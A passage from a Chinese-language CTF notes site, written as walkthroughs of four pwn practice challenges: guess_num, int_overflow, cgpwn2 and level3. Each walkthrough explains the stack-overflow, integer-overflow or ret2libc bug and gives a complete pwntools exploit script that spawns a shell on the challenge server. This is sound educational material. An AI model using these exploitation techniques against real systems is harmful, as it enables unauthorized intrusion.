<h2 id="0x08-guessnum"><a name="0x08-guessnum" class="anchor-navigation-ex-anchor" href="#0x08-guessnum"><i class="fa fa-link" aria-hidden="true"></i></a>0x08 guess_num</h2>
<p>Checksec:</p>
<pre><code class="lang-bash">Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
</code></pre>
<p>&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#x5982;&#x4E0B;</p>
<pre><code class="lang-cpp">  gets(&amp;v9);
  v4 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)seed[<span class="hljs-number">0</span>];
  srand(seed[<span class="hljs-number">0</span>]);
  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )
  {
    v8 = rand() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(i + <span class="hljs-number">1</span>));
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input your guess number:&quot;</span>);
    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v6);
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;---------------------------------&quot;</span>);
    <span class="hljs-keyword">if</span> ( v6 != v8 )
    {
      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;GG!&quot;</span>);
      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    v4 = <span class="hljs-string">&quot;Success!&quot;</span>;
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!&quot;</span>);
  }
  sub_C3E(v4);
</code></pre>
<p>&#x56E0;&#x4E3A;rand()&#x672C;&#x8D28;&#x662F;&#x4E0A;&#x662F;&#x6839;&#x636E;seed&#x751F;&#x6210;&#x7684;&#x4E00;&#x4E32;&#x4F2A;&#x968F;&#x673A;&#x6570;&#x5217;</p>
<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x8981;&#x8986;&#x76D6;seed(0)&#x4E3A;&#x6307;&#x5B9A;&#x503C;&#x5C31;&#x4E0D;&#x96BE;&#x9884;&#x8A00;&#x540E;&#x9762;&#x7684;&#x6570;&#x5B57;&#x4E86;</p>
<p>&#x663E;&#x7136;gets&#x662F;&#x53EF;&#x4EE5;&#x6EA2;&#x51FA;&#x7684;</p>
<p>v8&#x548C;seed[0]&#x5728;&#x6808;&#x4E0A;</p>
<pre><code class="lang-cpp">  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span>
  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span>
</code></pre>
<p>&#x5DEE;0x20&#xFF0C;&#x6240;&#x4EE5;&#x6784;&#x9020;</p>
<h3 id="payload_5"><a name="payload_5" class="anchor-navigation-ex-anchor" href="#payload_5"><i class="fa fa-link" aria-hidden="true"></i></a>Payload</h3>
<pre><code class="lang-cpp">payload=<span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">123</span>)
</code></pre>
<h3 id="exp_6"><a name="exp_6" class="anchor-navigation-ex-anchor" href="#exp_6"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> * <span class="hljs-comment">#&#x7528;&#x6765;&#x8C03;&#x7528;glibc&#xFF0C;&#x548C;&#x6E90;&#x7A0B;&#x5E8F;&#x91C7;&#x7528;&#x4E00;&#x81F4;&#x7684;rand&#x51FD;&#x6570;</span>
context(arch = <span class="hljs-string">&apos;amd64&apos;</span>, os = <span class="hljs-string">&apos;linux&apos;</span>)
payload=<span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">123</span>)
io=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;55317&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;Please let me know your name!&quot;</span>,payload)
libc=cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)
libc.srand(<span class="hljs-number">123</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
    io.sendlineafter(<span class="hljs-string">&quot;Please input your guess number:&quot;</span>,str(libc.rand()%<span class="hljs-number">6</span>+<span class="hljs-number">1</span>))
io.interactive()
</code></pre>
<h2 id="0x09-intoverflow"><a name="0x09-intoverflow" class="anchor-navigation-ex-anchor" href="#0x09-intoverflow"><i class="fa fa-link" aria-hidden="true"></i></a>0x09 int_overflow</h2>
<p>Checksec</p>
<pre><code class="lang-bash">Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
</code></pre>
<p>&#x62D6;&#x8FDB;ida pro</p>
<p>&#x770B;&#x5230;&#x4E00;&#x4E2A;&#x5F88;&#x5947;&#x602A;&#x7684;&#x51FD;&#x6570;</p>
<p>what_is_this()</p>
<pre><code class="lang-cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">what_is_this</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat flag&quot;</span>);
}
</code></pre>
<p>&#x663E;&#x7136;&#x662F;&#x4E2A;&#x201C;&#x540E;&#x95E8;&#x201D;</p>
<p>&#x518D;&#x5BF9;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5206;&#x6790;</p>
<pre><code class="lang-cpp"><span class="hljs-keyword">char</span> *__<span class="hljs-function">cdecl <span class="hljs-title">check_passwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span>
</span>{
  <span class="hljs-keyword">char</span> *result; <span class="hljs-comment">// eax</span>
  <span class="hljs-keyword">char</span> dest; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span>
  <span class="hljs-keyword">unsigned</span> __int8 v3; <span class="hljs-comment">// [esp+Fh] [ebp-9h]</span>

  v3 = <span class="hljs-built_in">strlen</span>(s);
  <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">3u</span> || v3 &gt; <span class="hljs-number">8u</span> )
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Password&quot;</span>);
    result = (<span class="hljs-keyword">char</span> *)fflush(<span class="hljs-built_in">stdout</span>);
  }
  <span class="hljs-keyword">else</span>
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);
    fflush(<span class="hljs-built_in">stdout</span>);
    result = <span class="hljs-built_in">strcpy</span>(&amp;dest, s);
  }
  <span class="hljs-keyword">return</span> result;
}
</code></pre>
<blockquote>
<p>char *strcpy(char* dest, const char *src);
strcpy &#x628A;&#x4ECE;src&#x5730;&#x5740;&#x5F00;&#x59CB;&#x4E14;&#x542B;&#x6709;NULL&#x7ED3;&#x675F;&#x7B26;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x590D;&#x5236;&#x5230;&#x4EE5;dest&#x5F00;&#x59CB;&#x7684;&#x5730;&#x5740;&#x7A7A;&#x95F4;
src&#x548C;dest&#x6240;&#x6307;&#x5185;&#x5B58;&#x533A;&#x57DF;&#x4E0D;&#x53EF;&#x4EE5;&#x91CD;&#x53E0;&#x4E14;dest&#x5FC5;&#x987B;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x7A7A;&#x95F4;&#x6765;&#x5BB9;&#x7EB3;src&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002;</p>
</blockquote>
<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;strcpy&#x662F;&#x4E0D;&#x4F1A;&#x68C0;&#x67E5;&#x76EE;&#x6807;&#x5730;&#x5740;&#x6709;&#x662F;&#x5426;&#x591F;&#x7528;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x5F31;&#x70B9;&#x8FDB;&#x884C;&#x6808;&#x6EA2;&#x51FA;&#xFF0C;&#x4FEE;&#x6539;result&#x7684;&#x503C;&#x4F7F;&#x4E4B;&#x5728;return&#x7684;&#x65F6;&#x5019;&#x6784;&#x9020;what_is_this()&#x7684;&#x4F2A;&#x6808;&#x5E27;&#xFF0C;&#x8FD4;&#x56DE;flag&#x503C;&#x3002;</p>
<pre><code class="lang-python">sh_addr=<span class="hljs-number">0x0804868B</span>
payload=<span class="hljs-string">&apos;a&apos;</span>*(<span class="hljs-number">0x14</span>+<span class="hljs-number">0x4</span>)+p32(sh_addr)
</code></pre>
<p>&#x4F46;&#x662F;&#x6784;&#x9020;&#x7684;&#x957F;&#x5EA6;&#x663E;&#x7136;&#x4E0D;&#x6EE1;&#x8DB3;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x7684;&#x9650;&#x5236;</p>
<p>&#x4F46;&#x662F;&#x6CE8;&#x610F;&#x5230;v3&#x662F;int_8&#x7C7B;&#x578B;&#xFF0C;&#x6700;&#x5927;&#x80FD;&#x8868;&#x793A;255,&#x6839;&#x636E;&#x6574;&#x6570;&#x7684;&#x5B58;&#x50A8;&#x539F;&#x7406;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x52A0;&#x4E00;&#x4E9B;&#x5B57;&#x7B26;&#x8BA9;&#x5176;&#x6EA2;&#x51FA;&#x56DE;&#x5230;3&#x5230;8&#x4E4B;&#x95F4;</p>
<h3 id="payload_6"><a name="payload_6" class="anchor-navigation-ex-anchor" href="#payload_6"><i class="fa fa-link" aria-hidden="true"></i></a>Payload</h3>
<pre><code class="lang-python">sh_addr=<span class="hljs-number">0x0804868B</span>
payload=<span class="hljs-string">&apos;a&apos;</span>*(<span class="hljs-number">0x14</span>+<span class="hljs-number">0x4</span>)+p32(sh_addr)+<span class="hljs-string">&apos;a&apos;</span>*(<span class="hljs-number">256</span><span class="hljs-number">-0x14</span><span class="hljs-number">-0x4</span><span class="hljs-number">-0x4</span>+<span class="hljs-number">4</span>)<span class="hljs-comment">#int_8-&gt;256=1</span>
</code></pre>
<h3 id="exp_7"><a name="exp_7" class="anchor-navigation-ex-anchor" href="#exp_7"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context(arch = <span class="hljs-string">&quot;amd64&quot;</span> ,os = <span class="hljs-string">&apos;linux&apos;</span>)
sh_addr=<span class="hljs-number">0x0804868B</span>
payload=<span class="hljs-string">&apos;a&apos;</span>*(<span class="hljs-number">0x14</span>+<span class="hljs-number">0x4</span>)+p32(sh_addr)+<span class="hljs-string">&apos;a&apos;</span>*(<span class="hljs-number">256</span><span class="hljs-number">-0x14</span><span class="hljs-number">-0x4</span><span class="hljs-number">-0x4</span>+<span class="hljs-number">4</span>)
io=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;45927&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;Please input your username:&quot;</span>,<span class="hljs-string">&quot;eki&quot;</span>)
io.sendafter(<span class="hljs-string">&quot;Please input your passwd:&quot;</span>,payload)
io.interactive()
</code></pre>
<h2 id="0x0a-cgpwn2"><a name="0x0a-cgpwn2" class="anchor-navigation-ex-anchor" href="#0x0a-cgpwn2"><i class="fa fa-link" aria-hidden="true"></i></a>0x0A cgpwn2</h2>
<p>checksec:</p>
<pre><code class="lang-bash">Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
</code></pre>
<p>&#x4E22;&#x8FDB;IDA pro &#x5206;&#x6790;</p>
<p>&#x5728;hello()&#x91CC;</p>
<pre><code class="lang-cpp"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">hello</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-keyword">char</span> *v0; <span class="hljs-comment">// eax</span>
  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ebx</span>
  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// ecx</span>
  <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// eax</span>
  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+12h] [ebp-26h]</span>
  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+14h] [ebp-24h]</span>
    <span class="hljs-comment">/**/</span>
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please tell me your name&quot;</span>);
  fgets(name, <span class="hljs-number">50</span>, <span class="hljs-built_in">stdin</span>);
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hello,you can leave some message here:&quot;</span>);
  <span class="hljs-keyword">return</span> gets(&amp;s);<span class="hljs-comment">//&#x53EF;&#x6784;&#x9020;&#x6808;&#x6EA2;&#x51FA;</span>
}
</code></pre>
<p>&#x548C; level&#x7C7B;&#x4F3C;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;system(&quot;/bin/sh&quot;)&#x7684;&#x4F2A;&#x6808;&#x5E27;</p>
<p>&#x6211;&#x4EEC;&#x5728;IDA pro&#x91CC;&#x627E;&#x5230;&#x4E86;system&#x7684;&#x5730;&#x5740;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x6B21;&#x6CA1;&#x6709;&quot;/bin/sh&quot;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x529E;</p>
<p>&#x6CE8;&#x610F;&#x5230;name&#x4F4D;&#x4E8E;bss&#x7AEF;&#xFF08;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x672A;&#x521D;&#x59CB;&#x5316;&#xFF09;</p>
<p>&#x800C;&#x4E14;&#x9898;&#x76EE;&#x53EF;&#x4EE5;&#x8BA9;&#x6211;&#x4EEC;&#x53BB;&#x4FEE;&#x6539;name</p>
<p>&#x6240;&#x4EE5;&#x6784;&#x9020;</p>
<p>Payload</p>
<pre><code class="lang-python">payload=<span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">0x26</span>+<span class="hljs-number">0x04</span>)+p32(system_addr)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4</span>+p32(name_addr)
</code></pre>
<p>Exp</p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
io=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;40904&quot;</span>)
sh=<span class="hljs-string">&quot;/bin/sh&quot;</span>
name_addr=<span class="hljs-number">0x0804A080</span>
system_addr=<span class="hljs-number">0x08048420</span>
payload=<span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">0x26</span>+<span class="hljs-number">0x04</span>)+p32(system_addr)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4</span>+p32(name_addr)
io.sendlineafter(<span class="hljs-string">&quot;please tell me your name&quot;</span>,sh)
io.sendlineafter(<span class="hljs-string">&quot;hello,you can leave some message here:&quot;</span>,payload)
io.interactive()
</code></pre>
<h2 id="0x0b-level3"><a name="0x0b-level3" class="anchor-navigation-ex-anchor" href="#0x0b-level3"><i class="fa fa-link" aria-hidden="true"></i></a>0x0B level3</h2>
<p>checksec:</p>
<pre><code class="lang-bash">Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
</code></pre>
<p>&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#x548C;level0&#x4E00;&#x81F4;</p>
<p>&#x4F46;&#x662F;&#x8FD9;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x5728;&#x7A0B;&#x5E8F;&#x91CC;&#x6CA1;&#x6709;system()&#x7684;&#x540E;&#x95E8;&#x4E86;&#x3002;&#x3002;&#x3002;&#x3002;&#x3002;</p>
<p>&#x600E;&#x4E48;&#x529E;&#x5462;</p>
<blockquote>
<p>&#x7A0B;&#x5E8F;&#x5BF9;&#x5916;&#x90E8;&#x51FD;&#x6570;&#x7684;&#x8C03;&#x7528;&#x9700;&#x8981;&#x5728;&#x751F;&#x6210;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x65F6;&#x5C06;&#x5916;&#x90E8;&#x51FD;&#x6570;&#x94FE;&#x63A5;&#x5230;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x94FE;&#x63A5;&#x7684;&#x65B9;&#x5F0F;&#x5206;&#x4E3A;&#x9759;&#x6001;&#x94FE;&#x63A5;&#x548C;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x3002;&#x9759;&#x6001;&#x94FE;&#x63A5;&#x5F97;&#x5230;&#x7684;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x5916;&#x90E8;&#x51FD;&#x6570;&#x7684;&#x5168;&#x90E8;&#x4EE3;&#x7801;&#xFF0C;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5F97;&#x5230;&#x7684;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x5E76;&#x4E0D;&#x5305;&#x542B;&#x5916;&#x90E8;&#x51FD;&#x6570;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x8FD0;&#x884C;&#x65F6;&#x5C06;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;&#xFF08;&#x82E5;&#x5E72;&#x5916;&#x90E8;&#x51FD;&#x6570;&#x7684;&#x96C6;&#x5408;&#xFF09;&#x52A0;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#x7684;&#x67D0;&#x4E2A;&#x4F4D;&#x7F6E;&#xFF0C;&#x518D;&#x5728;&#x53D1;&#x751F;&#x8C03;&#x7528;&#x65F6;&#x53BB;&#x94FE;&#x63A5;&#x5E93;&#x5B9A;&#x4F4D;&#x6240;&#x9700;&#x7684;&#x51FD;&#x6570;&#x3002;</p>
<p>&#x624B;&#x628A;&#x624B;&#x6559;&#x4F60;&#x6808;&#x6EA2;&#x51FA;&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x653E;&#x5F03;&#xFF08;&#x4E0B;&#xFF09;----- <a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank">https://zhuanlan.zhihu.com/p/25892385</a></p>
</blockquote>
<p>&#x6CE8;&#x610F;&#x5230;PIE&#x6CA1;&#x6709;&#x5F00;&#x542F;&#xFF0C;&#x90A3;&#x4E48;&#x5728;libc&#x4E2D;&#x51FD;&#x6570;&#x7684;offset&#x5C31;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5982;&#x679C;&#x627E;&#x51FA;&#x4E86;libc&#x7684;base address&#xFF0C;&#x7136;&#x540E;&#x8BA1;&#x7B97;&#x51FA;system&#x51FD;&#x6570;&#x7684;offset&#x5F97;&#x5230;system&#x51FD;&#x6570;&#x7684;&#x771F;&#x5B9E;&#x5730;&#x5740;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;pwn&#x4E86;&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x5148;&#x7528;write&#x6CC4;&#x9732;write&#x51FD;&#x6570;&#x7684;&#x5B9E;&#x9645;&#x5730;&#x5740;</p>
<p>&#x7136;&#x540E;&#x8BA1;&#x7B97;&#x51FA;&#x504F;&#x79FB;&#x91CF;</p>
<p>&#x63A5;&#x4E0B;&#x6765;&#x53EA;&#x8981;&#x8BA1;&#x7B97;&#x51FA;system&#x548C;&quot;/bin/sh&quot;&#x7684;&#x5B9E;&#x9645;&#x5730;&#x5740;&#x5C31;&#x53EF;&#x4EE5;&#x540C;level2&#x4E00;&#x6837;getshell&#x4E86;</p>
<h3 id="payload_7"><a name="payload_7" class="anchor-navigation-ex-anchor" href="#payload_7"><i class="fa fa-link" aria-hidden="true"></i></a>Payload</h3>
<pre><code class="lang-python">payload1 = <span class="hljs-string">&apos;a&apos;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>) 
payload2 = <span class="hljs-string">&apos;a&apos;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) +p32(system_addr) + <span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">4</span> + p32(shell_addr)
</code></pre>
<h3 id="exp_8"><a name="exp_8" class="anchor-navigation-ex-anchor" href="#exp_8"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
elf = ELF(<span class="hljs-string">&quot;./level3&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)

write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]
write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]
main_addr = elf.sym[<span class="hljs-string">&quot;main&quot;</span>]
write_libc = libc.sym[<span class="hljs-string">&quot;write&quot;</span>]
system_libc = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]


payload1 = <span class="hljs-string">&apos;a&apos;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>) <span class="hljs-comment">#&#x6784;&#x9020;write&#x6808;&#x5E27;&#x6CC4;&#x9732;write_got&#x5730;&#x5740; &#x5E76;&#x91CD;&#x65B0;&#x56DE;&#x5230;main&#x51FD;&#x6570;</span>

io=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;42198&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload1)
write_addr=u32(io.recv(<span class="hljs-number">4</span>))

libc_base_addr = write_addr - write_libc <span class="hljs-comment">#&#x8BA1;&#x7B97;&#x504F;&#x79FB;&#x91CF; &#x5F97;&#x5230;&#x57FA;&#x5730;&#x5740;</span>
system_addr = libc_base_addr + system_libc
shell_addr = libc_base_addr  + next(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))

payload2 = <span class="hljs-string">&apos;a&apos;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) +p32(system_addr) + <span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">4</span> + p32(shell_addr)

io.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload2)
io.interactive()
</code></pre>
<footer class="page-footer"><span class="copyright">&#xA9; Eki&apos;s CTF-notes 2019-2021 CC-by-nc-sa 4.0&#x3002; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x672C;&#x7F51;&#x7AD9;&#x6700;&#x540E;&#x4FEE;&#x8BA2;&#x4E8E;&#xFF1A;
2021-05-07 16:30:35
</span></footer> <link rel="stylesheet" type="text/css" href="https://storage.googleapis.com/app.klipse.tech/css/codemirror.css"> <script>     window.klipse_settings = {         selector: ".language-klipse, .lang-eval-clojure",         selector_eval_js: ".lang-eval-js",         selector_eval_python_client: ".lang-eval-python",         selector_eval_php: ".lang-eval-php",         selector_eval_scheme: ".lang-eval-scheme",         selector_eval_ruby: ".lang-eval-ruby",         selector_reagent: ".lang-reagent",        selector_google_charts: ".lang-google-chart",        selector_es2017: ".lang-eval-es2017",        selector_jsx: ".lang-eval-jsx",        selector_transpile_jsx: ".lang-transpile-jsx",        selector_render_jsx: ".lang-render-jsx",        selector_react: ".lang-react",        selector_eval_markdown: ".lang-render-markdown",        selector_eval_lambdaway: ".lang-render-lambdaway",        selector_eval_cpp: ".lang-eval-cpp",        selector_eval_html: ".lang-render-html",        selector_sql: ".lang-eval-sql",        selector_brainfuck: "lang-eval-brainfuck",        selector_js: ".lang-transpile-cljs"    }; </script> <script src="https://storage.googleapis.com/app.klipse.tech/plugin/js/klipse_plugin.js"></script>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="web-execrise-area.html" class="navigation navigation-prev " aria-label="Previous page: Web Exercise Area">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="reverse-execrise-area.html" class="navigation navigation-next " aria-label="Next page: Reverse Exercise Area">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"PWN Exercise Area","level":"1.4.4","depth":2,"next":{"title":"Reverse Exercise Area","level":"1.4.5","depth":2,"path":"adworld/reverse-execrise-area.md","ref":"adworld/reverse-execrise-area.md","articles":[]},"previous":{"title":"Web Exercise Area","level":"1.4.3","depth":2,"path":"adworld/web-execrise-area.md","ref":"adworld/web-execrise-area.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","katex","tbfed-pagefooter","theme-comscore","anchor-navigation-ex","-lunr","-search","search-plus","custom-favicon","ga","multipart","advanced-emoji","github","-sharing","sharing-plus","klipse","donate","pageview-count","code","lightbox","auto-scroll-table"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"&copy Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。","modify_label":"本网站最后修订于：","modify_format":"YYYY-MM-DD HH:mm:ss"},"github":{"url":"https://github.com/ekixu"},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"auto-scroll-table":{},"multipart":{},"code":{"copyButtons":true},"donate":{"alipay":"https://ctf.ieki.xyz/assets/images/alipay.jpg","alipayText":"支付宝打赏","button":"赏","title":"","wechat":"https://ctf.ieki.xyz/assets/images/wechat.jpg","wechatText":"微信打赏"},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":"/assets/images/favicon.ico","lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"pageview-count":{},"custom-favicon":{},"ga":{"configuration":"auto","token":"UA-156105693-2"},"klipse":{"myConfigKey":"it's the default value"},"advanced-emoji":{"embedEmojis":false},"sharing":{"qq":false,"all":["douban","facebook","google","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","whatsapp"],"douban":false,"facebook":false,"weibo":true,"twitter":true,"pocket":false,"google":true,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Eki","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Eki's CTF","links":{"sidebar":{"主站 Eki's Blog":"https://ieki.xyz"}},"gitbook":"*","description":"CTF笔记"},"file":{"path":"adworld/pwn-exercise-area.md","mtime":"2021-05-07T08:30:35.917Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-05-07T08:31:26.574Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
